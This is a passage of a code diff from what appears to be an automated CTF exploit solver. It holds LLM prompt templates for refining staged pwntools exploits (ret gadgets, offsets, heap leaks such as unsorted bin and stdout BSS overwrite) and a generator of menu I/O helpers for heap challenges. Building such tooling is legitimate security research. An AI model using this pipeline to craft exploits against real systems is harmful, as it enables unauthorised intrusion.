+- Incorrect I/O string matching (wrong menu strings)
+- Stack alignment issues (ret gadget)
+- Wrong offsets or addresses
+- Null byte handling
+- Timing issues (add sleep if needed)
+
+**I/O RULES (most common failure cause):**
+- Each `scanf()` call needs its own `p.sendlineafter(prompt, value)`
+- Each `read()` call needs its own `p.sendafter(prompt, data)`
+- NEVER combine multiple inputs into one `p.send()` call
+- NEVER use `p.send(b"1 " + ...)` to combine menu + size + content
+
+**DO NOT change the exploitation technique/strategy.**
+- If the stage description says "stdout BSS partial overwrite", keep that approach
+- If it says "unsorted bin leak", keep that approach
+- Only fix HOW the technique is implemented (I/O, offsets, sizes), not WHAT technique is used
+- Changing from stdout BSS to GOT leak is a STRATEGY CHANGE — FORBIDDEN in refinement
+""")
+
+
+STAGE_REFINE_USER = env.from_string("""## Failing Stage: {{ stage.stage_id }} (Stage {{ stage.stage_index + 1 }})
+- Expected marker: `{{ stage.verification_marker }}`
+- Refinement attempt: {{ stage.refinement_attempts + 1 }}
+
+## Current Script (FAILED)
+```python
+{{ stage.code }}
+```
+
+## Error Output
+```
+{{ error_output[:2000] }}
+```
+
+## Analysis Document
+{{ analysis_document }}
+
+{% if io_helper_code %}
+## Correct I/O Helper Functions (USE THESE)
+```python
+{{ io_helper_code }}
+```
+{% endif %}
+
+Fix ONLY the Stage {{ stage.stage_index + 1 }} logic. Previous stages are verified working.
+""")
+
+
+def _generate_io_helper_code(state: SolverState) -> str:
+    """
+    Generate I/O helper function code from decompiled source.
+
+    Analyzes the decompiled code for menu-based patterns (scanf + read/gets)
+    and generates correct sendlineafter/sendafter helper functions.
+    """
+    import re
+
+    analysis = state.get("analysis", {})
+    functions = analysis.get("decompile", {}).get("functions", [])
+    io_patterns = analysis.get("io_patterns", [])
+
+    if not functions:
+        return ""
+
+    # Combine all decompiled code
+    all_code = "\n".join(f.get("code", "") for f in functions)
+
+    # Detect menu pattern: look for printf strings followed by scanf
+    # Common patterns: "1. Allocate", "2. Free", "3. Print", "4. Edit"
+    menu_lines = re.findall(r'(?:printf|puts)\s*\(\s*"([^"]*\\n)"', all_code)
+    if not menu_lines:
+        menu_lines = re.findall(r'"(\d+\.\s+\w+(?:\\n)?)"', all_code)
+
+    # Find the last menu line to use as the sync point
+    last_menu_line = ""
+    for line in menu_lines:
+        line = line.replace("\\n", "\n")
+        if line.strip():
+            last_menu_line = line
+
+    if not last_menu_line:
+        # Fallback: try to find from io_patterns
+        for p in io_patterns:
+            prompt = p.get("prompt", "")
+            if any(kw in prompt.lower() for kw in ("edit", "quit", "exit", "delete")):
+                last_menu_line = prompt
+                break
+
+    # Detect specific prompts from io_patterns or decompiled code
+    size_prompt = ""
+    content_prompt = ""
+    edit_prompt = ""
+
+    for p in io_patterns:
+        prompt = p.get("prompt", "")
+        if "size" in prompt.lower():
+            size_prompt = prompt
+        elif "content" in prompt.lower():
+            content_prompt = prompt
+        elif "edit" in prompt.lower():
+            edit_prompt = prompt
+
+    # Fallback: extract from decompiled code
+    if not size_prompt:
+        m = re.search(r'printf\s*\(\s*"(Size[^"]*)"', all_code)
+        if m:
+            size_prompt = m.group(1).replace("\\n", "\n")
+    if not content_prompt:
+        m = re.search(r'printf\s*\(\s*"(Content[^"]*)"', all_code)
+        if m:
+            content_prompt = m.group(1).replace("\\n", "\n")
+    if not edit_prompt:
+        m = re.search(r'printf\s*\(\s*"(Edit[^"]*)"', all_code)
+        if m:
+            edit_prompt = m.group(1).replace("\\n", "\n")
+
+    if not last_menu_line:
+        return ""  # Can't generate helpers without menu pattern
+
+    # Escape for Python bytes
+    def py_bytes(s: str) -> str:
+        return s.replace("\\", "\\\\").replace('"', '\\"').replace("\n", "\\n")
+
+    menu_b = py_bytes(last_menu_line)
+    helpers = []
+
+    # Detect if alloc uses read() (fixed size) or scanf/gets (line-based)
+    uses_read = "read(" in all_code and ("size" in all_code.lower() or "len" in all_code.lower())
+
+    # alloc helper
+    if size_prompt and content_prompt:
+        if uses_read:
+            helpers.append(f'''def alloc(size, content):
+    p.sendlineafter(b"{menu_b}", b"1")
+    p.sendlineafter(b"{py_bytes(size_prompt)}", str(size).encode())
+    p.sendafter(b"{py_bytes(content_prompt)}", content.ljust(size - 1, b"\\x00")[:size - 1])''')
+        else:
+            helpers.append(f'''def alloc(size, content):
+    p.sendlineafter(b"{menu_b}", b"1")
+    p.sendlineafter(b"{py_bytes(size_prompt)}", str(size).encode())
+    p.sendlineafter(b"{py_bytes(content_prompt)}", content)''')
+
+    # free helper
+    helpers.append(f'''def free():
+    p.sendlineafter(b"{menu_b}", b"2")''')
+
+    # print helper
+    if content_prompt:
+        helpers.append(f'''def print_content():
+    p.sendlineafter(b"{menu_b}", b"3")
+    p.recvuntil(b"{py_bytes(content_prompt)}")
+    return p.recvuntil(b"1.", drop=True)''')
+
+    # edit helper
+    if edit_prompt:
+        if uses_read:
+            helpers.append(f'''def edit(content, size):
+    p.sendlineafter(b"{menu_b}", b"4")
+    p.sendafter(b"{py_bytes(edit_prompt)}", content.ljust(size - 1, b"\\x00")[:size - 1])''')
+        else:
+            helpers.append(f'''def edit(content):
+    p.sendlineafter(b"{menu_b}", b"4")
+    p.sendlineafter(b"{py_bytes(edit_prompt)}", content)''')
+
+    return "\n\n".join(helpers) if helpers else ""
+
+
+def build_stage_exploit_messages(
+    state: SolverState,
+    current_stage: Dict[str, Any],
+    verified_stages: List[Dict[str, Any]],
+) -> List[Dict[str, str]]:
+    """Build prompt messages for stage exploit generation."""
+    analysis = state.get("analysis", {})
+    staged = state.get("staged_exploit", {})
+
+    system_content = STAGE_EXPLOIT_SYSTEM.render(
+        current_stage=current_stage,
+        total_stages=len(staged.get("stages", [])),
+        verified_stages=verified_stages,
+        challenge=state.get("challenge", {}),
+        binary_path=state.get("binary_path", ""),
+    )
+
+    # Generate I/O helper code from decompiled binary
+    io_helper_code = _generate_io_helper_code(state)
+
+    user_content = STAGE_EXPLOIT_USER.render(
+        analysis_document=build_analysis_document(state),
+        binary_path=state.get("binary_path", ""),
+        io_patterns=analysis.get("io_patterns", []),
+        decompiled_functions=analysis.get("decompile", {}).get("functions", []),
+        current_stage=current_stage,
+        io_helper_code=io_helper_code,
+    )
+
+    return [
+        {"role": "system", "content": system_content},
+        {"role": "user", "content": user_content},
+    ]
